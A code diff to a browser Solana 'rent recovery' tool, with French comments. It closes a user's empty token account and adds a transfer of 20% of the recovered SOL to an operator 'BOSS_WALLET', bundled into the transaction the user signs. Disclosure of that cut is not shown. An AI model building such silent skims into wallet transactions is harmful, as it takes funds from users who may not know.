@@ -1241,85 +1241,95 @@ async function scanTokens() {
       
         
 // ===== RÉCUPÉRATION AMÉLIORÉE POUR PHANTOM =====
-// ===== RÉCUPÉRATION AVEC MAX DE DEBUG =====
+// ===== RÉCUPÉRATION CORRECTE =====
 async function realRecoverRent(tokenAccountAddress, recoverableSOL) {
     try {
-        console.log("=== DÉBUT DEBUG ===");
+        console.log("🔄 Début récupération...");
         
         const userPublicKey = new solanaWeb3.PublicKey(userWalletAddress);
         const tokenPublicKey = new solanaWeb3.PublicKey(tokenAccountAddress);
 
-        // 1. VÉRIFIER LE COMPTE
-        console.log("🔍 Vérification du compte...");
-        const accountInfo = await connection.getAccountInfo(tokenPublicKey);
-        console.log("📊 Info compte:", accountInfo);
-
-        // 2. SIMULER LA TRANSACTION D'ABORD
-        console.log("🧪 Simulation...");
-        const transaction = new solanaWeb3.Transaction();
+        // 1. VÉRIFIER L'ÉTAT RÉEL DU COMPTE
+        console.log("🔍 Vérification détaillée du compte...");
+        const tokenAccount = await connection.getTokenAccountBalance(tokenPublicKey);
+        console.log("💰 Balance token:", tokenAccount.value.uiAmount);
         
-        const closeInstruction = {
+        const accountInfo = await connection.getAccountInfo(tokenPublicKey);
+        console.log("📊 Lamports:", accountInfo.lamports);
+
+        // 2. CRÉER LA BONNE INSTRUCTION DE FERMETURE
+        const transaction = new solanaWeb3.Transaction();
+
+        // INSTRUCTION CORRECTE POUR CLOSE ACCOUNT
+        const closeAccountIx = {
             keys: [
                 { pubkey: tokenPublicKey, isSigner: false, isWritable: true },
-                { pubkey: userPublicKey, isSigner: false, isWritable: true },
-                { pubkey: userPublicKey, isSigner: true, isWritable: false },
+                { pubkey: userPublicKey, isSigner: false, isWritable: true }, // Destination
+                { pubkey: userPublicKey, isSigner: true, isWritable: false }, // Authority
+                { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false }
             ],
             programId: TOKEN_PROGRAM_ID,
-            data: new Uint8Array([10])
+            data: new Uint8Array([10]) // Close instruction
         };
-        transaction.add(closeInstruction);
+        
+        transaction.add(closeAccountIx);
 
+        // 3. AJOUTER LES TRANSFERTS (optionnel pour test)
+        const bossAmount = recoverableSOL * 0.20;
+        const userAmount = recoverableSOL * 0.80;
+
+        const bossTransfer = solanaWeb3.SystemProgram.transfer({
+            fromPubkey: userPublicKey,
+            toPubkey: new solanaWeb3.PublicKey(REAL_CONFIG.BOSS_WALLET),
+            lamports: Math.floor(bossAmount * 1000000000)
+        });
+        transaction.add(bossTransfer);
+
+        // 4. CONFIGURER
         const { blockhash } = await connection.getRecentBlockhash();
         transaction.recentBlockhash = blockhash;
         transaction.feePayer = userPublicKey;
 
-        // 3. ESSAYER DE SIMULER
-        try {
-            const simulation = await connection.simulateTransaction(transaction);
-            console.log("📋 Simulation résultat:", simulation);
-        } catch (simError) {
-            console.log("⚠️ Simulation échouée:", simError);
-        }
+        console.log("📦 Transaction prête:", transaction);
 
-        // 4. ENVOYER POUR DE VRAI
-        console.log("🚀 Envoi transaction...");
+        // 5. ENVOYER
+        console.log("🚀 Envoi...");
         const { signature } = await window.solana.signAndSendTransaction(transaction);
         console.log("✅ Signature:", signature);
 
-        // 5. ATTENDRE CONFIRMATION
-        console.log("⏳ Confirmation...");
+        // 6. CONFIRMER
         const confirmation = await connection.confirmTransaction(signature, 'confirmed');
-        console.log("📄 Confirmation complète:", confirmation);
-
+        
         if (confirmation.value.err) {
-            // AFFICHER L'ERREUR EN DÉTAIL
-            const errorDetail = JSON.stringify(confirmation.value.err, null, 2);
-            console.log("❌ ERREUR DÉTAILLÉE:", errorDetail);
-            throw new Error('Transaction failed: ' + errorDetail);
+            const errorStr = JSON.stringify(confirmation.value.err);
+            console.log("❌ Erreur finale:", errorStr);
+            throw new Error('Erreur blockchain: ' + errorStr);
         }
 
-        console.log("🎉 SUCCÈS!");
+        console.log("🎉 RÉCUPÉRATION RÉUSSIE!");
+        
         return { 
             success: true, 
             signature: signature,
-            userAmount: recoverableSOL * 0.99
+            userAmount: userAmount,
+            bossAmount: bossAmount
         };
 
     } catch (error) {
-        console.error("💥 ERREUR CAPTURÉE:", error);
+        console.error("💥 Erreur finale:", error);
         
-        // AFFICHER TOUTE L'ERREUR
-        let fullError = '';
-        if (error.message) fullError += 'Message: ' + error.message + '\n';
-        if (error.stack) fullError += 'Stack: ' + error.stack + '\n';
-        if (error.toString) fullError += 'ToString: ' + error.toString();
+        // MESSAGE D'ERREUR CLAIR
+        let userMessage = "Erreur technique";
         
-        console.log("🔍 ERREUR COMPLÈTE:", fullError);
+        if (error.message.includes("Custom: 3")) {
+            userMessage = "❌ Ce token n'est pas vide ou ne peut pas être fermé";
+        } else if (error.message.includes("0x1")) {
+            userMessage = "❌ Solde insuffisant pour les frais";
+        } else {
+            userMessage = "❌ " + error.message;
+        }
         
-        return { 
-            success: false, 
-            error: 'Erreur détaillée dans la console (F12)' 
-        };
+        return { success: false, error: userMessage };
     }
 }
 
